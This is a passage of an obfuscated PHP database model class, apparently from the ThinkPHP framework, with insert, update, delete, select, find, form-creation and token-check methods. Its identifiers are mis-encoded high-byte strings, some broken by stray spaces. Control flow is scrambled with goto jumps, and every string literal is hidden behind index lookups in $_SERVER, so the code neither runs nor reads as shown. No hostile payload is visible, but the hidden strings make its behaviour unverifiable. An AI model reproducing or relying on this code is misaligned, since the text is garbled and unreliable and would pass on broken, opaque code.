5)); $c‚Ä’Ã®Ü[$b­ß„²¨åÒ] = $DæñÂˆŒÍ«[0]; return $this->where($c‚Ä’Ã®Ü)->find(); } elseif (strtolower(substr($f­†°í×®ó, 0, 10)) == $aÜÊÓ†¨Ë§[260]) { $B´¢èœŠ£ˆ = think_parse_name(substr($f­†°í×®ó, 10)); $c‚Ä’Ã®Ü[$B´¢èœŠ£ˆ] = $DæñÂˆŒÍ«[0]; return $this->where($c‚Ä’Ã®Ü)->getField($DæñÂˆŒÍ«[1]); } elseif (isset($this->_scope[$f­†°í×®ó])) { return $this->scope($f­†°í×®ó, $DæñÂˆŒÍ«[0]); } elseif (method_exists($this, $f­†°í×®ó)) { array_unshift($DæñÂˆŒÍ«, $f­†°í×®ó); return call_user_func_array(array($this, $aÜÊÓ†¨Ë§[261]), $DæñÂˆŒÍ«); } else { return call_user_func_array(array(parent, $f­†°í×®ó), $DæñÂˆŒÍ«); } } protected function call() { goto E»ùÜ‡ˆ™Õ; E»ùÜ‡ˆ™Õ: $F§øÈó‡ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d¤óˆïõí = func_get_args(); $EÔ²¦ÉèÂ = array_shift($d¤óˆïõí); goto eàÀŒ…Ú; eàÀŒ…Ú: $fº‰•óôŒ• = $EÔ²¦ÉèÂ; if (is_array($EÔ²¦ÉèÂ)) { $fº‰•óôŒ• = $EÔ²¦ÉèÂ[1]; $EÔ²¦ÉèÂ = $EÔ²¦ÉèÂ[0]; } $dà‚æóŒ = count($d¤óˆïõí) - 1; goto D²âÙµ˜š; Aíù™øÛÀà: $Dã÷ˆßÆÁå = call_user_func_array(array($this, $EÔ²¦ÉèÂ), $d¤óˆïõí); if (method_exists($this, $F§øÈó‡ò[265])) { $AíÀêİÇ¼ = call_user_func_array(array($this, $F§øÈó‡ò[266]), array($fº‰•óôŒ•, $d¤óˆïõí, $Dã÷ˆßÆÁå)); if ($AíÀêİÇ¼) { return $AíÀêİÇ¼; } } return $Dã÷ˆßÆÁå; goto D¡» ÖùˆÃ; D²âÙµ˜š: if (isset($d¤óˆïõí[$dà‚æóŒ]) && $d¤óˆïõí[$dà‚æóŒ] === $EÔ²¦ÉèÂ) { think_exception(__CLASS__ . $F§øÈó‡ò[4] . $EÔ²¦ÉèÂ . think_lang($F§øÈó‡ò[262])); return; } $d¤óˆïõí[] = $EÔ²¦ÉèÂ; if (method_exists($this, $F§øÈó‡ò[263])) { $AíÀêİÇ¼ = call_user_func_array(array($this, $F§øÈó‡ò[264]), array($fº‰•óôŒ•, $d¤óˆïõí)); if (!is_null($AíÀêİÇ¼) && $AíÀêİÇ¼ !== !1) { return $AíÀêİÇ¼; } } goto Aíù™øÛÀà; D¡» ÖùˆÃ: } protected function _initialize() { } protected function _facade($f²“¸í—±¯) { $EÉ×ç¤÷© =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!empty($this->fields)) { foreach ($f²“¸í—±¯ as $a±Õ„…ğñğ => $cÃá÷¾œŞ”) { if (!in_array($a±Õ„…ğñğ, $this->fields, !0)) { unset($f²“¸í—±¯[$a±Õ„…ğñğ]); } elseif (is_scalar($cÃá÷¾œŞ”)) { $this->_parseType($f²“¸í—±¯, $a±Õ„…ğñğ); } } } if (!empty($this->options[$EÉ×ç¤÷©[267]])) { $f²“¸í—±¯ = array_map($this->options[$EÉ×ç¤÷©[267]], $f²“¸í—±¯); unset($this->options[$EÉ×ç¤÷©[267]]); } $this->_beforeWrite($f²“¸í—±¯); return $f²“¸í—±¯; } protected function _beforeWrite(&$C‚íÑÆÔÖè) { } public function add($b³èëµ‚¯ = '', $eç¦Ö×ÅÉ = array(), $cäéÉ´ß«Ù = false) { goto cÓ£Èåà¸¡; E´¯î„æÏŞ: return $F…ŠÅ£ãØ; goto a‚ïÆ…ƒá; fïò¹—ìØ¦: if (!1 === $this->_beforeInsert($b³èëµ‚¯, $eç¦Ö×ÅÉ)) { return !1; } $F…ŠÅ£ãØ = $this->db->insert($b³èëµ‚¯, $eç¦Ö×ÅÉ, $cäéÉ´ß«Ù); if (!1 !== $F…ŠÅ£ãØ) { $f°Áœçá¦ï = $this->getLastInsID(); if ($f°Áœçá¦ï) { $b³èëµ‚¯[$this->getPk()] = $f°Áœçá¦ï; $this->_after_insert($b³èëµ‚¯, $eç¦Ö×ÅÉ); return $f°Áœçá¦ï; } $this->_after_insert($b³èëµ‚¯, $eç¦Ö×ÅÉ); } goto E´¯î„æÏŞ; cÓ£Èåà¸¡: if (empty($b³èëµ‚¯)) { if (!empty($this->data)) { $b³èëµ‚¯ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[çŞáÓæÚô‚Ô‡][268]); return !1; } } $eç¦Ö×ÅÉ = $this->_parseOptions($eç¦Ö×ÅÉ); $b³èëµ‚¯ = $this->_facade($b³èëµ‚¯); goto fïò¹—ìØ¦; a‚ïÆ…ƒá: } protected function _beforeInsert(&$FªâÓ¤ë¶Ö, $b¯¼‰›¨’—) { } protected function _after_insert($b»È¤ç„ÔÙ, $b›î“ôîÚÊ) { } public function addAll($dš»éèì•Ê, $DšØ¨ØÍØ³ = array(), $bÖÉ–¦­¹ = false) { goto eø½—…¦ˆ‹; F½¦œ¤ŸÊ: return $aºÍ–Ö¾ù; goto aòÛĞÂ¤–È; f‰ÁÙÂ¤–ğ: foreach ($dš»éèì•Ê as $AÃˆïÈÙê¤ => $cé‰ß·‡‰) { $dš»éèì•Ê[$AÃˆïÈÙê¤] = $this->_facade($cé‰ß·‡‰); } if (method_exists($this->db, $eôØÑôŒŞ‡[269])) { $aºÍ–Ö¾ù = $this->db->insertAll($dš»éèì•Ê, $DšØ¨ØÍØ³, $bÖÉ–¦­¹); } else { $this->startTrans(); foreach ($dš»éèì•Ê as $AÃˆïÈÙê¤ => $cé‰ß·‡‰) { $aºÍ–Ö¾ù = $this->db->insert($cé‰ß·‡‰, $DšØ¨ØÍØ³, $bÖÉ–¦­¹); } $this->commit(); } if (!1 !== $aºÍ–Ö¾ù) { $A¢§ŠºÓÆØ = $this->getLastInsID(); if ($A¢§ŠºÓÆØ) { return $A¢§ŠºÓÆØ; } } goto F½¦œ¤ŸÊ; eø½—…¦ˆ‹: $eôØÑôŒŞ‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($dš»éèì•Ê)) { $this->error = think_lang($eôØÑôŒŞ‡[268]); return !1; } $DšØ¨ØÍØ³ = $this->_parseOptions($DšØ¨ØÍØ³); goto f‰ÁÙÂ¤–ğ; aòÛĞÂ¤–È: } public function selectAdd($f×¸‹êÌ… = '', $a÷¬¤Œà¥ë = '', $e×†”Ç‚—í = array()) { $f‡•é‘Ë =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e×†”Ç‚—í = $this->_parseOptions($e×†”Ç‚—í); if (!1 === ($EÛÅåß¡Ûö = $this->db->selectInsert($f×¸‹êÌ… ? $f×¸‹êÌ… : $e×†”Ç‚—í[$f‡•é‘Ë[270]], $a÷¬¤Œà¥ë ? $a÷¬¤Œà¥ë : $this->getTableName(), $e×†”Ç‚—í))) { $this->error = think_lang($f‡•é‘Ë[271]); return !1; } else { return $EÛÅåß¡Ûö; } } public function save($d·—ïŒÉÂ = '', $b¯°³Œ—„‡ = array()) { goto cóÅÜÎíåŞ; CÇí¾¥ÔÅ±: if (!1 !== $e†Ú¶ÉÌ‘ë) { if (isset($FºÎô«è´)) { $d·—ïŒÉÂ[$BÈ©ÆèšŠŒ] = $FºÎô«è´; } $this->_afterUpdate($d·—ïŒÉÂ, $b¯°³Œ—„‡); } return $e†Ú¶ÉÌ‘ë; goto b©ŞÍ­êÅø; cóÅÜÎíåŞ: $a“…°Ø ƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($d·—ïŒÉÂ)) { if (!empty($this->data)) { $d·—ïŒÉÂ = $this->data; $this->data = array(); } else { $this->error = think_lang($a“…°Ø ƒ[268]); return !1; } } $d·—ïŒÉÂ = $this->_facade($d·—ïŒÉÂ); goto bìğ¯ƒ´Ú; bìğ¯ƒ´Ú: $b¯°³Œ—„‡ = $this->_parseOptions($b¯°³Œ—„‡); $BÈ©ÆèšŠŒ = $this->getPk(); if (!isset($b¯°³Œ—„‡[$a“…°Ø ƒ[272]])) { if (isset($d·—ïŒÉÂ[$BÈ©ÆèšŠŒ])) { $e´œ„×áİİ[$BÈ©ÆèšŠŒ] = $d·—ïŒÉÂ[$BÈ©ÆèšŠŒ]; $b¯°³Œ—„‡[$a“…°Ø ƒ[272]] = $e´œ„×áİİ; unset($d·—ïŒÉÂ[$BÈ©ÆèšŠŒ]); } else { $this->error = think_lang($a“…°Ø ƒ[271]); return !1; } } goto A©‚‰‰ĞÍ; A©‚‰‰ĞÍ: if (is_array($b¯°³Œ—„‡[$a“…°Ø ƒ[272]]) && isset($b¯°³Œ—„‡[$a“…°Ø ƒ[272]][$BÈ©ÆèšŠŒ])) { $FºÎô«è´ = $b¯°³Œ—„‡[$a“…°Ø ƒ[272]][$BÈ©ÆèšŠŒ]; } if (!1 === $this->_beforeUpdate($d·—ïŒÉÂ, $b¯°³Œ—„‡)) { return !1; } $e†Ú¶ÉÌ‘ë = $this->db->update($d·—ïŒÉÂ, $b¯°³Œ—„‡); goto CÇí¾¥ÔÅ±; b©ŞÍ­êÅø: } protected function _beforeUpdate(&$F¢ŠÛİ¹°ß, $C—â¥³ß¬) { } protected function _afterUpdate($eªñÌˆ»°±, $Aí‚áˆ«ùØ) { } public function delete($CšîŒ ·‡ = array()) { goto dµ¯ƒÚˆŒ; d§æŠâ¥¿å: if (is_numeric($CšîŒ ·‡) || is_string($CšîŒ ·‡)) { if (strpos($CšîŒ ·‡, $DÀ…Ñ•µ÷—[57])) { $FÖ£Ãà‘Å§[$eÊŒÎñÎ‚Ş] = array($DÀ…Ñ•µ÷—[273], $CšîŒ ·‡); } else { $FÖ£Ãà‘Å§[$eÊŒÎñÎ‚Ş] = $CšîŒ ·‡; } $this->options[$DÀ…Ñ•µ÷—[272]] = $FÖ£Ãà‘Å§; } $CšîŒ ·‡ = $this->_parseOptions(); if (is_array($CšîŒ ·‡[$DÀ…Ñ•µ÷—[272]]) && isset($CšîŒ ·‡[$DÀ…Ñ•µ÷—[272]][$eÊŒÎñÎ‚Ş])) { $D©«õƒÂ“Ç = $CšîŒ ·‡[$DÀ…Ñ•µ÷—[272]][$eÊŒÎñÎ‚Ş]; } goto DòÔšÁªã; dµ¯ƒÚˆŒ: $DÀ…Ñ•µ÷— =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($CšîŒ ·‡) && empty($this->options[$DÀ…Ñ•µ÷—[272]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $eÊŒÎñÎ‚Ş = $this->getPk(); goto d§æŠâ¥¿å; DòÔšÁªã: $FêÓ×“ä…È = $this->db->delete($CšîŒ ·‡); if (!1 !== $FêÓ×“ä…È) { $e¼±ô¤§İ = array(); if (isset($D©«õƒÂ“Ç)) { $e¼±ô¤§İ[$eÊŒÎñÎ‚Ş] = $D©«õƒÂ“Ç; } $this->_after_delete($e¼±ô¤§İ, $CšîŒ ·‡); } return $FêÓ×“ä…È; goto fø…ö˜âˆÛ; fø…ö˜âˆÛ: } protected function _after_delete($dŸçÊÏâ¼Å, $B“š¿„ÛÒ ) { } public function select($aš’Î² ã£ = array()) { goto BŞµíâĞ¾Ì; BŞµíâĞ¾Ì: $a„„·¶çÛ¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_string($aš’Î² ã£) || is_numeric($aš’Î² ã£)) { $B¦›”ì›”å = $this->getPk(); if (strpos($aš’Î² ã£, $a„„·¶çÛ¢[57])) { $C„ø‰¬¤£§[$B¦›”ì›”å] = array($a„„·¶çÛ¢[273], $aš’Î² ã£); } else { $C„ø‰¬¤£§[$B¦›”ì›”å] = $aš’Î² ã£; } $this->options[$a„„·¶çÛ¢[272]] = $C„ø‰¬¤£§; } elseif (!1 === $aš’Î² ã£) { $aš’Î² ã£ = $this->_parseOptions(); return $a„„·¶çÛ¢[274] . $this->db->buildSelectSql($aš’Î² ã£) . $a„„·¶çÛ¢[275]; } $aš’Î² ã£ = $this->_parseOptions(); goto F¡«ĞÒ¶ÃÄ; b¤‡Ú‹’ƒƒ: $this->_afterSelect($a„¨Ä×„”, $aš’Î² ã£); return $a„¨Ä×„”; goto D¹ñÀ’‰¯ô; F¡«ĞÒ¶ÃÄ: $a„¨Ä×„” = $this->db->select($aš’Î² ã£); if (!1 === $a„¨Ä×„”) { return !1; } if (empty($a„¨Ä×„”)) { return null; } goto b¤‡Ú‹’ƒƒ; D¹ñÀ’‰¯ô: } protected function _afterSelect(&$cÖî—Ñƒ­, $Bù„´ó…Ø) { } public function buildSql($eĞˆñ§Àíó = array()) { $CÍ»Àèµ’Á =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eĞˆñ§Àíó = $this->_parseOptions($eĞˆñ§Àíó); return $CÍ»Àèµ’Á[274] . $this->db->buildSelectSql($eĞˆñ§Àíó) . $CÍ»Àèµ’Á[275]; } public function optionsValue($f—ÙàÙ“‘Ø = null) { if (is_null($f—ÙàÙ“‘Ø)) { return $this->options; } elseif (is_array($f—ÙàÙ“‘Ø)) { $this->options = array_merge($this->options, $f—ÙàÙ“‘Ø); } } protected function _parseOptions($dÃ¼ï¡º¡× = array()) { goto DáÃµ÷†›Ğ; f‘ÜñÊÜ£˜: if (!isset($dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[276]])) { $dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[276]] = $this->getTableName(); $BÔ®É´•ÔÜ = $this->fields; } else { $BÔ®É´•ÔÜ = $this->getDbFields(); } if (!empty($dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[277]])) { $dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[276]] .= $BÊšˆ„‚Œñ[60] . $dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[277]]; } $dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[278]] = $this->name; goto fÈ“ß¼Ùö†; fÈ“ß¼Ùö†: if (isset($dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[272]]) && is_array($dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[272]]) && !empty($BÔ®É´•ÔÜ) && !isset($dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[279]]) && !isset($dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[276]])) { foreach ($dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[272]] as $dì‡¤êË‰¬ => $Dæ–‘×àÁó) { $dì‡¤êË‰¬ = trim($dì‡¤êË‰¬); if (in_array($dì‡¤êË‰¬, $BÔ®É´•ÔÜ, !0)) { if (is_scalar($Dæ–‘×àÁó)) { $this->_parseType($dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[272]], $dì‡¤êË‰¬); } } elseif (!is_numeric($dì‡¤êË‰¬) && $BÊšˆ„‚Œñ[80] != substr($dì‡¤êË‰¬, 0, 1) && !1 === strpos($dì‡¤êË‰¬, $BÊšˆ„‚Œñ[101]) && !1 === strpos($dì‡¤êË‰¬, $BÊšˆ„‚Œñ[257]) && !1 === strpos($dì‡¤êË‰¬, $BÊšˆ„‚Œñ[280]) && !1 === strpos($dì‡¤êË‰¬, $BÊšˆ„‚Œñ[281])) { unset($dÃ¼ï¡º¡×[$BÊšˆ„‚Œñ[272]][$dì‡¤êË‰¬]); } } } $this->_options_filter($dÃ¼ï¡º¡×); return $dÃ¼ï¡º¡×; goto b÷˜‹”Á¼; DáÃµ÷†›Ğ: $BÊšˆ„‚Œñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_array($dÃ¼ï¡º¡×)) { $dÃ¼ï¡º¡× = array_merge($this->options, $dÃ¼ï¡º¡×); } $this->options = array(); goto f‘ÜñÊÜ£˜; b÷˜‹”Á¼: } protected function _options_filter(&$CåÙŞˆ˜À…) { } protected function _parseType(&$EÑŒ‹ª·§”, $B©„ğÕö¸ª) { $cÎğŸ‚“Ó =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($this->options[$cÎğŸ‚“Ó[282]][$cÎğŸ‚“Ó[4] . $B©„ğÕö¸ª])) { $b¨±ãë™ŞÄ = strtolower($this->fields[$cÎğŸ‚“Ó[249]][$B©„ğÕö¸ª]); if (!1 !== strpos($b¨±ãë™ŞÄ, $cÎğŸ‚“Ó[283])) { } elseif (!1 === strpos($b¨±ãë™ŞÄ, $cÎğŸ‚“Ó[284]) && !1 !== strpos($b¨±ãë™ŞÄ, $cÎğŸ‚“Ó[285])) { $EÑŒ‹ª·§”[$B©„ğÕö¸ª] = intval($EÑŒ‹ª·§”[$B©„ğÕö¸ª]); } elseif (!1 !== strpos($b¨±ãë™ŞÄ, $cÎğŸ‚“Ó[286]) || !1 !== strpos($b¨±ãë™ŞÄ, $cÎğŸ‚“Ó[287])) { $EÑŒ‹ª·§”[$B©„ğÕö¸ª] = floatval($EÑŒ‹ª·§”[$B©„ğÕö¸ª]); } elseif (!1 !== strpos($b¨±ãë™ŞÄ, $cÎğŸ‚“Ó[288])) { $EÑŒ‹ª·§”[$B©„ğÕö¸ª] = (bool) $EÑŒ‹ª·§”[$B©„ğÕö¸ª]; } } } public function find($F¡˜ƒ…‚õ = array()) { goto A‚„Ş†ª±; A‚„Ş†ª±: $d­ôášøŒĞ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_numeric($F¡˜ƒ…‚õ) || is_string($F¡˜ƒ…‚õ)) { $bï£°³‰¯Ë[$this->getPk()] = intval($F¡˜ƒ…‚õ); $this->options[$d­ôášøŒĞ[272]] = $bï£°³‰¯Ë; } $this->options[$d­ôášøŒĞ[289]] = 1; goto B‹É…¡Å¿Â; CÈ˜ñê°¿: if (!empty($this->options[$d­ôášøŒĞ[290]])) { return $this->returnResult($this->data, $this->options[$d­ôášøŒĞ[290]]); } return $this->data; goto c±ŞÈæ“”¨; dĞÄ°£“¬‡: if (empty($BÑõƒñÏ )) { return null; } $this->data = $BÑõƒñÏ [0]; $this->_afterFind($this->data, $F¡˜ƒ…‚õ); goto CÈ˜ñê°¿; B‹É…¡Å¿Â: $F¡˜ƒ…‚õ = $this->_parseOptions(); $BÑõƒñÏ  = $this->db->select($F¡˜ƒ…‚õ); if (!1 === $BÑõƒñÏ ) { return !1; } goto dĞÄ°£“¬‡; c±ŞÈæ“”¨: } protected function _afterFind(&$E‡¶öÁ£¹ö, $F³‡ğÈ‡ƒ) { } protected function returnResult($CÏ“å¨º¶, $a¤“²¤› = '') { $Fó›ì²ááˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($a¤“²¤›) { if (is_callable($a¤“²¤›)) { return call_user_func($a¤“²¤›, $CÏ“å¨º¶); } switch (strtolower($a¤“²¤›)) { case $Fó›ì²ááˆ[291]: return json_encode($CÏ“å¨º¶); case $Fó›ì²ááˆ[292]: return xml_encode($CÏ“å¨º¶); } } return $CÏ“å¨º¶; } public function parseFieldsMap($CàáãÒ—, $DÆ«ÕÜÎ¡ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $e«”ÜÛß½Œ => $e›å‡öº¼¤) { if ($DÆ«ÕÜÎ¡ == 1) { if (isset($CàáãÒ—[$e›å‡öº¼¤])) { $CàáãÒ—[$e«”ÜÛß½Œ] = $CàáãÒ—[$e›å‡öº¼¤]; unset($CàáãÒ—[$e›å‡öº¼¤]); } } else { if (isset($CàáãÒ—[$e«”ÜÛß½Œ])) { $CàáãÒ—[$e›å‡öº¼¤] = $CàáãÒ—[$e«”ÜÛß½Œ]; unset($CàáãÒ—[$e«”ÜÛß½Œ]); } } } } return $CàáãÒ—; } public function setField($AŞŒˆ‘ªØƒ, $b„èÃù¸­ = '') { if (is_array($AŞŒˆ‘ªØƒ)) { $dÚùÁ¢­®Ã = $AŞŒˆ‘ªØƒ; } else { $dÚùÁ¢­®Ã[$AŞŒˆ‘ªØƒ] = $b„èÃù¸­; } return $this->save($dÚùÁ¢­®Ã); } public function setAdd($còœ¡ĞµÀ¤, $E Ü™–ÜëÀ = 1) { $bÁ“¨ˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Bø–ˆÃ÷¶Ÿ = $còœ¡ĞµÀ¤ . $bÁ“¨ˆ[293] . $E Ü™–ÜëÀ; if ($E Ü™–ÜëÀ < 0) { $Bø–ˆÃ÷¶Ÿ = $còœ¡ĞµÀ¤ . $E Ü™–ÜëÀ; } return $this->setField($còœ¡ĞµÀ¤, array($bÁ“¨ˆ[294], $Bø–ˆÃ÷¶Ÿ)); } public function getField($b¯æì»‹Ù³, $Bç²ªˆ­Ù = null) { $aÈ·¼î’›î =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b¾›±ºí¢†[$aÈ·¼î’›î[270]] = $b¯æì»‹Ù³; $b¾›±ºí¢† = $this->_parseOptions($b¾›±ºí¢†); $b¯æì»‹Ù³ = trim($b¯æì»‹Ù³); if (strpos($b¯æì»‹Ù³, $aÈ·¼î’›î[57])) { if (!isset($b¾›±ºí¢†[$aÈ·¼î’›î[289]])) { $b¾›±ºí¢†[$aÈ·¼î’›î[289]] = is_numeric($Bç²ªˆ­Ù) ? $Bç²ªˆ­Ù : $aÈ·¼î’›î[43]; } $bèù–îï´Ÿ = $this->db->select($b¾›±ºí¢†); if (!empty($bèù–îï´Ÿ)) { goto AÉ¦³óÕ; e’ÖŒ¾ÀôŒ: $C‘‰Â–ºò = array_shift($b¯æì»‹Ù³); $C™ÓŞ‰÷ºÚ = array(); $bÆÈæÁè¨Ù = count($B©£¹Ÿ¥†…); goto eò¤ò–‹Ü©; eò¤ò–‹Ü©: foreach ($bèù–îï´Ÿ as $bòæÎŞ““·) { $A‡©¨ÚÏ÷¥ = $bòæÎŞ““·[$e¡…é‘“İà]; if (2 == $bÆÈæÁè¨Ù) { $C™ÓŞ‰÷ºÚ[$A‡©¨ÚÏ÷¥] = $bòæÎŞ““·[$C‘‰Â–ºò]; } else { $C™ÓŞ‰÷ºÚ[$A‡©¨ÚÏ÷¥] = is_string($Bç²ªˆ­Ù) ? implode($Bç²ªˆ­Ù, $bòæÎŞ““·) : $bòæÎŞ““·; } } return $C™ÓŞ‰÷ºÚ; goto e·°†ƒö±ˆ; AÉ¦³óÕ: $B©£¹Ÿ¥†… = explode($aÈ·¼î’›î[57], $b¯æì»‹Ù³); $b¯æì»‹Ù³ = array_keys($bèù–îï´Ÿ[0]); $e¡…é‘“İà = array_shift($b¯æì»‹Ù³); goto e’ÖŒ¾ÀôŒ; e·°†ƒö±ˆ: } } else { if (!0 !== $Bç²ªˆ­Ù) { $b¾›±ºí¢†[$aÈ·¼î’›î[289]] = is_numeric($Bç²ªˆ­Ù) ? $Bç²ªˆ­Ù : 1; } if ($Bç²ªˆ­Ù === $aÈ·¼î’›î[252]) { unset($b¾›±ºí¢†[$aÈ·¼î’›î[289]]); } $bòæÎŞ““· = $this->db->select($b¾›±ºí¢†); if (!empty($bòæÎŞ““·)) { if ($Bç²ªˆ­Ù === $aÈ·¼î’›î[252]) { return reset($bòæÎŞ““·[0]); } if (!0 !== $Bç²ªˆ­Ù && 1 == $b¾›±ºí¢†[$aÈ·¼î’›î[289]]) { return reset($bòæÎŞ““·[0]); } foreach ($bòæÎŞ““· as $eŒì‹ÔŞ¯) { $eùÉéÔöÃ[] = $eŒì‹ÔŞ¯[$b¯æì»‹Ù³]; } return $eùÉéÔöÃ; } } return null; } public function create($c·¸á‹ÑÍƒ = '', $bïßŠ‘¬Ó = '') { goto dñö£’Â§; eÆîõª˜£: if (isset($F½¹Â³¥ù)) { if (is_string($F½¹Â³¥ù)) { $F½¹Â³¥ù = explode($eÒ‡Í›¸‚Ë[57], $F½¹Â³¥ù); } if (think_config($eÒ‡Í›¸‚Ë[295])) { $F½¹Â³¥ù[] = think_config($eÒ‡Í›¸‚Ë[296]); } foreach ($c·¸á‹ÑÍƒ as $c¾ö™´¤Ô => $f¾°ˆ·¥îğ) { if (!in_array($c¾ö™´¤Ô, $F½¹Â³¥ù)) { unset($c·¸á‹ÑÍƒ[$c¾ö™´¤Ô]); } } } if (!$this->autoValidation($c·¸á‹ÑÍƒ, $bïßŠ‘¬Ó)) { return !1; } if (!$this->autoCheckToken($c·¸á‹ÑÍƒ)) { $this->error = think_lang($eÒ‡Í›¸‚Ë[297]); return !1; } goto d”Ì†™³; AÑË˜ñºÒ¿: $c·¸á‹ÑÍƒ = $this->parseFieldsMap($c·¸á‹ÑÍƒ, 0); $bïßŠ‘¬Ó = $bïßŠ‘¬Ó ? $bïßŠ‘¬Ó : (!empty($c·¸á‹ÑÍƒ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$eÒ‡Í›¸‚Ë[270]])) { $F½¹Â³¥ù = $this->options[$eÒ‡Í›¸‚Ë[270]]; unset($this->options[$eÒ‡Í›¸‚Ë[270]]); } elseif ($bïßŠ‘¬Ó == THINK_MODEL_INSERT && isset($this->insertFields)) { $F½¹Â³¥ù = $this->insertFields; } elseif ($bïßŠ‘¬Ó == THINK_MODEL_UPDATE && isset($this->updateFields)) { $F½¹Â³¥ù = $this->updateFields; } goto eÆîõª˜£; dñö£’Â§: $eÒ‡Í›¸‚Ë =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($c·¸á‹ÑÍƒ)) { $c·¸á‹ÑÍƒ = $_POST; } elseif (is_object($c·¸á‹ÑÍƒ)) { $c·¸á‹ÑÍƒ = get_object_vars($c·¸á‹ÑÍƒ); } if (empty($c·¸á‹ÑÍƒ) || !is_array($c·¸á‹ÑÍƒ)) { $this->error = think_lang($eÒ‡Í›¸‚Ë[268]); return !1; } goto AÑË˜ñºÒ¿; d”Ì†™³: if ($this->autoCheckFields) { $F½¹Â³¥ù = $this->getDbFields(); foreach ($c·¸á‹ÑÍƒ as $c¾ö™´¤Ô => $f¾°ˆ·¥îğ) { if (!in_array($c¾ö™´¤Ô, $F½¹Â³¥ù)) { unset($c·¸á‹ÑÍƒ[$c¾ö™´¤Ô]); } elseif (MAGIC_QUOTES_GPC && is_string($f¾°ˆ·¥îğ)) { $c·¸á‹ÑÍƒ[$c¾ö™´¤Ô] = stripslashes($f¾°ˆ·¥îğ); } } } $this->autoOperation($c·¸á‹ÑÍƒ, $bïßŠ‘¬Ó); $this->data = $c·¸á‹ÑÍƒ; goto EĞ•Õóˆ¶Ì; EĞ•Õóˆ¶Ì: return $c·¸á‹ÑÍƒ; goto eËŠ¦·ã; eËŠ¦·ã: } public function autoCheckToken($AÙá³å³µÚ) { $F†Ò¨˜÷ê =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (isset($this->options[$F†Ò¨˜÷ê[298]]) && !$this->options[$F†Ò¨˜÷ê[298]]) { return !0; } if (think_config($F†Ò¨˜÷ê[295])) { $A™Ú˜Ûçé“ = think_config($F†Ò¨˜÷ê[296]); if (!isset($AÙá³å³µÚ[$A™Ú˜Ûçé“]) || Session::get($A™Ú˜Ûçé“)) { return !1; } list($a×ôëÖ¯÷Æ, $BŒ‡Æïï) = explode($F†Ò¨˜÷ê[80], $AÙá³å³µÚ[$A™Ú˜Ûçé“]); if ($BŒ‡Æïï && Session::get($A™Ú˜Ûçé“ . $F†Ò¨˜÷ê[101] . $a×ôëÖ¯÷Æ) === $BŒ‡Æïï) { Session::remove($A™Ú˜Ûçé“ . $F†Ò¨˜÷ê[101] . $a×ôëÖ¯÷Æ); return !0; } if (think_config($F†Ò¨˜÷ê[299])) { Session::remove($A™Ú˜Ûçé“ . $F†Ò¨˜÷ê[101] . $a×ôëÖ¯÷Æ); } return !1; } return !0; } public function regex($eŠÃ¤çÒ‰, $BÕ·ê×ëä‚) { $FÓ¾õÚì÷â =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b·ß˜¼œ«Ø = array($FÓ¾õÚì÷â[300] => $FÓ¾õÚì÷â[301], $FÓ¾õÚì÷â[302] => $FÓ¾õÚì÷â[303], $FÓ¾õÚì÷â[304] => $FÓ¾õÚì÷â[305], $FÓ¾õÚì÷â[306] => $FÓ¾õÚì÷â[307], $FÓ¾õÚì÷â[308] => $FÓ¾õÚì÷â[309], $FÓ¾õÚì÷â[310] => $FÓ¾õÚì÷â[311], $FÓ¾õÚì÷â[312] => $FÓ¾õÚì÷â[313], $FÓ¾õÚì÷â[287] => $FÓ¾õÚì÷â[314], $FÓ¾õÚì÷â[315] => $FÓ¾õÚì÷â[316]); if (isset($b·ß˜¼œ«Ø[strtolower($BÕ·ê×ëä‚)])) { $BÕ·ê×ëä‚ = $b·ß˜¼œ«Ø[strtolower($BÕ·ê×ëä‚)]; } return preg_match($BÕ·ê×ëä‚, $eŠÃ¤çÒ‰) === 1; } private function autoOperation(&$fĞğŞÃ‘ò—, $DÕšÓÌ˜œŒ) { $AÃÜãô†œ² =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!empty($this->options[$AÃÜãô†œ²[317]])) { $FíàƒŒöÂÓ = $this->options[$AÃÜãô†œ²[317]]; unset($this->options[$AÃÜãô†œ²[317]]); } elseif (!empty($this->_auto)) { $FíàƒŒöÂÓ = $this->_auto; } if (isset($FíàƒŒöÂÓ)) { foreach ($FíàƒŒöÂÓ as $D‡©øË•) { if (empty($D‡©øË•[2])) { $D‡©øË•[2] = THINK_MODEL_INSERT; } if ($DÕšÓÌ˜œŒ == $D‡©øË•[2] || $D‡©øË•[2] == THINK_MODEL_BOTH) { switch (trim($D‡©øË•[3])) { case $AÃÜãô†œ²[318]: case $AÃÜãô†œ²[319]: $E©…Ë—È‡ = isset($D‡©øË•[4]) ? (array) $D‡©øË•[4] : 